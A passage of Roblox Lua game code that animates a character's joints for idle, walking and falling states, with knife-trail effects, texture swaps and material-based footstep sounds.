			rutj.C0=rutjC0*cf(0,-.05+.05*cos(Sine/IdleVal),.1*CosSin(Sine/IdleVal))*angles(CosSin(Sine/IdleVal)*2,0,0,true)*cf(0,0,0)*angles(0,0,0,true)*cf(CFA/50)*angles(CFA.X,CFA.Y,CFA.Z,true)
			rs.C0=rsC0*cf(0,-.05-.05*CosSin(Sine/IdleVal),-.025*cos(Sine/IdleVal))*angles(-sin(Sine/IdleVal)*3,cos(Sine/IdleVal)*2.5,0,true)*cf(-.2,-.1,.05)*angles(5,7.5,-2,true)*angles(-CFA.X,-CFA.Y,-CFA.Z,true)
			ls.C0=lsC0*cf(0,-.05-.05*CosSin(Sine/IdleVal),-.025*cos(Sine/IdleVal))*angles(-sin(Sine/IdleVal)*3,-cos(Sine/IdleVal)*2.5,0,true)*cf(.2,-.1,.05)*angles(5,-7.5,2,true)*angles(-CFA.X,-CFA.Y,-CFA.Z,true)
			rh.C0=rhC0*cf(0,.05-.05*cos(Sine/IdleVal),-.05+.05*cos(Sine/IdleVal))*angles(-1.5+cos(Sine/IdleVal)*1.5,0,0,true)*cf(0,0,0)*angles(0,-5,1.5,true)*cf(-CFA/50)*angles(-CFA.X*1.5,-CFA.Y,-CFA.Z*1.5,true)
			lh.C0=lhC0*cf(0,.05-.05*cos(Sine/IdleVal),-.05+.05*cos(Sine/IdleVal))*angles(-1.5+cos(Sine/IdleVal)*1.5,0,0,true)*cf(0,0,0)*angles(0,5,-1.5,true)*cf(-CFA/50)*angles(-CFA.X*1.5,-CFA.Y,-CFA.Z*1.5,true)
		end)()
	end
	if random(0,1,50)==1 and KnifeToggled and Knife then Eff(Knife.CFrame*cf(random(-Knife.Size.X/2,Knife.Size.X/2,100),0,0)*angles(random(-pi,pi,1000),random(-pi,pi,1000),random(-pi,pi,1000)),random(1,5),false,1) end
	if tick()-LastTentTick>TentTime then
		LastTentTick,TentTime=tick(),random(.5,5,10)
		if h then
			local Dir=angles(random(-180,180),random(-180,180),random(-180,180),true)
			local Hit,Pos,NID=Raycast(h.Position+v3(random(-100,100,10),random(-100,100,10),random(-25,25,10)),Dir.LookVector,{char,workspace.Terrain},950)
			if Hit then
				local CF=cf(Pos,Pos-NID)*angles(90,0,0,true)
				Eff(CF,random(5,20),true)
			end
		end
	end
	if tick()-LastClenchTick>ClenchTime then LastClenchTick,ClenchTime=tick(),random(.05,.25,100) Smiles.Texture=Smiles.Texture=="rbxassetid://5676391391" and "rbxassetid://5676391735" or "rbxassetid://5676391391" end
	if KnifeTrail and Knife then KTPosDelay=clamp(KTPosDelay-1,0,30) if not OldKTPos then OldKTPos=KTRPos end KTPos=KTRPos if KTPos and OldKTPos and KTHit and KTPosDelay==0 then LeaveKnifeTrail(KTPos,OldKTPos,KTHit) OldKTPos=KTPos MagDamage(Knife.Position,v3(1,1,1)*1.73,true,15) end end
	if not KnifeTrail or not Knife or not KTHit then OldKTPos=nil end
	if not Moving and Stand then
		Change=1
		local IdleVal=30
		nec.C0=nec.C0:Lerp(necC0*cf(0,0,0)*angles(sin(Sine/IdleVal)*2,CosSin(Sine/(IdleVal*4))*10,0,true)*cf(0,0,0)*angles(-10,0,10,true),.1)
		rutj.C0=rutj.C0:Lerp(rutjC0*cf(0,-.05+.05*cos(Sine/IdleVal),.1*CosSin(Sine/IdleVal))*angles(CosSin(Sine/IdleVal)*2,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		rs.C0=rs.C0:Lerp(rsC0*cf(0,-.05-.05*CosSin(Sine/IdleVal),-.025*cos(Sine/IdleVal))*angles(-sin(Sine/IdleVal)*3,cos(Sine/IdleVal)*2.5,0,true)*cf(-.2,-.1,.05)*angles(5,7.5,-2,true),.1)
		ls.C0=ls.C0:Lerp(lsC0*cf(0,-.05-.05*CosSin(Sine/IdleVal),-.025*cos(Sine/IdleVal))*angles(-sin(Sine/IdleVal)*3,-cos(Sine/IdleVal)*2.5,0,true)*cf(.2,-.1,.05)*angles(5,-7.5,2,true),.1)
		rh.C0=rh.C0:Lerp(rhC0*cf(0,.05-.05*cos(Sine/IdleVal),-.05+.05*cos(Sine/IdleVal))*angles(-1.5+cos(Sine/IdleVal)*1.5,0,0,true)*cf(0,0,0)*angles(0,-5,1.5,true),.1)
		lh.C0=lh.C0:Lerp(lhC0*cf(0,.05-.05*cos(Sine/IdleVal),-.05+.05*cos(Sine/IdleVal))*angles(-1.5+cos(Sine/IdleVal)*1.5,0,0,true)*cf(0,0,0)*angles(0,5,-1.5,true),.1)
		if Knife and KnifeW then KnifeW.C0=KnifeW.C0:Lerp(KnC0*cf(0,0,0)*angles(0,180,0,true)*angles(-20,0,0,true),.1) end
	elseif Moving and Stand then
		local WSVal=4/clamp(hum.WalkSpeed/40,.25,2)*hrp.Size.Y/2
		Change=.875
		nec.C0=nec.C0:Lerp(necC0*cf(0,0,0)*angles(sin(Sine/(WSVal/2))*2.5,0,0,true)*cf(0,0,0)*angles(5*MoveZ,-60*MoveX,0,true),.2/(t.Size.Y/2)*(hum.WalkSpeed/16)/3)
		rutj.C0=rutj.C0:Lerp(rutjC0*cf(0,.8*cos(Sine/(WSVal/2)),0)*angles(CosSin(Sine/(WSVal/2))*15,sin(Sine/WSVal)*10,0,true)*cf(0,0,0)*angles(-10*MoveZ,0,-10*MoveX,true),.2/(t.Size.Y/2)*(hum.WalkSpeed/16)/3)
		rs.C0=rs.C0:Lerp(rsC0*cf(0,0,.5*sin(Sine/WSVal)*MoveZ)*angles(-CosSin(Sine/WSVal)*120*MoveZ,0,0,true)*angles(0,-CosSin(Sine/WSVal)*70*MoveZ,0,true)*cf(-.15,0,0)*angles(10,0,-10*abs(MoveZ),true),.2/(t.Size.Y/2)*(hum.WalkSpeed/16)/3)
		ls.C0=ls.C0:Lerp(lsC0*cf(0,0,-.5*sin(Sine/WSVal)*MoveZ)*angles(CosSin(Sine/WSVal)*120*MoveZ,0,0,true)*angles(0,-CosSin(Sine/WSVal)*70*MoveZ,0,true)*cf(.15,0,0)*angles(10,0,10*abs(MoveZ),true),.2/(t.Size.Y/2)*(hum.WalkSpeed/16)/3)
		rh.C0=rh.C0:Lerp(rhC0*cf(0,.1+.75*cos(Sine/WSVal),-.2-.9*cos(Sine/WSVal))*angles(CosSin(Sine/WSVal)*200*MoveZ,0,CosSin(Sine/WSVal)*160*MoveX,true)*cf(0,0,0)*angles(-7.5*abs(MoveZ),0,0,true),.2/(t.Size.Y/2)*(hum.WalkSpeed/16)/3)
		lh.C0=lh.C0:Lerp(lhC0*cf(0,.1+-.75*cos(Sine/WSVal),-.2+.9*cos(Sine/WSVal))*angles(-CosSin(Sine/WSVal)*200*MoveZ,0,-CosSin(Sine/WSVal)*160*MoveX,true)*cf(0,0,0)*angles(-7.5*abs(MoveZ),0,0,true),.2/(t.Size.Y/2)*(hum.WalkSpeed/16)/3)
		if Knife and KnifeW then KnifeW.C0=KnifeW.C0:Lerp(KnC0*cf(0,0,0)*angles(0,180,0,true)*angles(-20,0,0,true),.2/(t.Size.Y/2)*(hum.WalkSpeed/16)/3) end
		--thanks to kyu or neb.. whatever
		if cos(Sine/WSVal)/2>.2 and Step=="L" then
			Step="R"
			if StandR then
				local SoundId=StepSounds[StandR.Material.Name] or 0
				if StandR.Material=="Sand" and (StandR.Color.r>.7 and StandR.Color.g>.7 and StandR.Color.b>.7) then
					SoundId=StepSounds["Snow"]
				end
				local SizeVal=StandR.Size*RNID
				if SoundId==941640049 then
					SizeVal=SizeVal/2
				end
				Sound(SoundId,(.35*clamp((WSVal)/1.5,.5,3.5))/clamp(math.max(SizeVal.X,SizeVal.Y,SizeVal.Z),.5,1.25),random(.9,1.1,100)*clamp(math.max(SizeVal.X,SizeVal.Y,SizeVal.Z)/10,.5,1.2)*clamp((WSVal)/1.5,.5,2),t)
			end
		end
		if cos(Sine/WSVal)/2<-.2 and Step=="R" then
			Step="L"
			if StandL then
				local SoundId=StepSounds[StandL.Material.Name] or 0
				if StandL.Material==Enum.Material.Sand and (StandL.Color.r>.7 and StandL.Color.g>.7 and StandL.Color.b>.7) then
					SoundId=StepSounds["Snow"]
				end
				local SizeVal=StandL.Size*LNID
				if SoundId==941640049 then
					SizeVal=SizeVal/2
				end
				Sound(SoundId,(.35*clamp((WSVal)/1.5,.5,3.5))/clamp(math.max(SizeVal.X,SizeVal.Y,SizeVal.Z),.5,1.25),random(.9,1.1,100)*clamp(math.max(SizeVal.X,SizeVal.Y,SizeVal.Z)/10,.5,1.2)*clamp((WSVal)/1.5,.5,2),t)
			end
		end
		--[[
		nec.C0=nec.C0:Lerp(necC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		rutj.C0=rutj.C0:Lerp(rutjC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		rs.C0=rs.C0:Lerp(rsC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		ls.C0=ls.C0:Lerp(lsC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		rh.C0=rh.C0:Lerp(rhC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		lh.C0=lh.C0:Lerp(lhC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		
		nec.C0=nec.C0:Lerp(necC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.2/(t.Size.Y/2)*(WSVal)/3)
		rutj.C0=rutj.C0:Lerp(rutjC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.2/(t.Size.Y/2)*(WSVal)/3)
		rs.C0=rs.C0:Lerp(rsC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.2/(t.Size.Y/2)*(WSVal)/3)
		ls.C0=ls.C0:Lerp(lsC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.2/(t.Size.Y/2)*(WSVal)/3)
		rh.C0=rh.C0:Lerp(rhC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.2/(t.Size.Y/2)*(WSVal)/3)
		lh.C0=lh.C0:Lerp(lhC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.2/(t.Size.Y/2)*(WSVal)/3)
		
		-																									-
		
		Joints.Neck.C0=Joints.Neck.C0:Lerp(Joints.Neck.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.Root.C0=Joints.Root.C0:Lerp(Joints.Root.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.Waist.C0=Joints.Waist.C0:Lerp(Joints.Waist.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.RightShoulder.C0=Joints.RightShoulder.C0:Lerp(Joints.RightShoulder.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.RightElbow.C0=Joints.RightElbow.C0:Lerp(Joints.RightElbow.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.RightWrist.C0=Joints.RightWrist.C0:Lerp(Joints.RightWrist.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.LeftShoulder.C0=Joints.LeftShoulder.C0:Lerp(Joints.LeftShoulder.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.LeftElbow.C0=Joints.LeftElbow.C0:Lerp(Joints.LeftElbow.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.LeftWrist.C0=Joints.LeftWrist.C0:Lerp(Joints.LeftWrist.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.RightHip.C0=Joints.RightHip.C0:Lerp(Joints.RightHip.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.RightKnee.C0=Joints.RightKnee.C0:Lerp(Joints.RightKnee.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.RightAnkle.C0=Joints.RightAnkle.C0:Lerp(Joints.RightAnkle.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.LeftHip.C0=Joints.LeftHip.C0:Lerp(Joints.LeftHip.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.LeftKnee.C0=Joints.LeftKnee.C0:Lerp(Joints.LeftKnee.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		Joints.LeftAnkle.C0=Joints.LeftAnkle.C0:Lerp(Joints.LeftAnkle.Link.C0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(0,0,0,true),.1)
		--]]
	elseif not Stand then
		Change=1
		nec.C0=nec.C0:Lerp(necC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(clamp(hrp.Velocity.Y,-15,15),0,0,true),.2)
		rutj.C0=rutj.C0:Lerp(rutjC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,0,0)*angles(clamp(hrp.Velocity.Y,-30,20),0,0,true),.2)
		rs.C0=rs.C0:Lerp(rsC0*cf(0,0,0)*angles(0,5,-7.5,true)*cf(-(clamp(hrp.Velocity.Y/20,-.45,0)),0,0)*angles((clamp(hrp.Velocity.Y*4,0,150)),0,-(clamp(hrp.Velocity.Y*4,-120,0)),true),.2)
		ls.C0=ls.C0:Lerp(lsC0*cf(0,0,0)*angles(0,-5,7.5,true)*cf((clamp(hrp.Velocity.Y/20,-.45,0)),0,0)*angles((clamp(hrp.Velocity.Y*4,0,150)),0,(clamp(hrp.Velocity.Y*4,-120,0)),true),.2)
		rh.C0=rh.C0:Lerp(rhC0*cf(0,0,0)*angles(0,0,0,true)*cf(0,.4,-.35)*angles(-10,-5,5,true),.2)
		lh.C0=lh.C0:Lerp(lhC0*cf(0,0,0)*angles(clamp(-hrp.Velocity.Y,-25,35),0,0,true)*cf(0,.2,-.15)*angles(-2.5,5,-5,true),.2)
		if Knife and KnifeW then KnifeW.C0=KnifeW.C0:Lerp(KnC0*cf(0,0,0)*angles(0,180,0,true)*angles(-20,0,0,true),.2) end
	end
	if Type=="R6" then
		nec.C1=nec.C1:Lerp(necC1,.2)
		rutj.C1=rutj.C1:Lerp(rutjC1,.2) 
		rs.C1=rs.C1:Lerp(rsC1,.2)
		ls.C1=ls.C1:Lerp(lsC1,.2)
		rh.C1=rh.C1:Lerp(rhC1,.2)
		lh.C1=lh.C1:Lerp(lhC1,.2)
		necC0,necC1=cf(0,t.Size.Y/2,0),cf(0,-h.Size.Y/2,0)
		rutjC0,rutjC1=cf(0,0,0),cf(0,0,0)
		rsC0,rsC1=cf(t.Size.X/2,t.Size.Y/4,0),cf(-ra.Size.X/2,ra.Size.Y/4,0)
		lsC0,lsC1=cf(-t.Size.X/2,t.Size.Y/4,0),cf(la.Size.X/2,la.Size.Y/4,0)
		rhC0,rhC1=cf(t.Size.X/4,-t.Size.Y/2,0),cf(0,rl.Size.Y/2,0)
		lhC0,lhC1=cf(-t.Size.X/4,-t.Size.Y/2,0),cf(0,ll.Size.Y/2,0)
	end
end
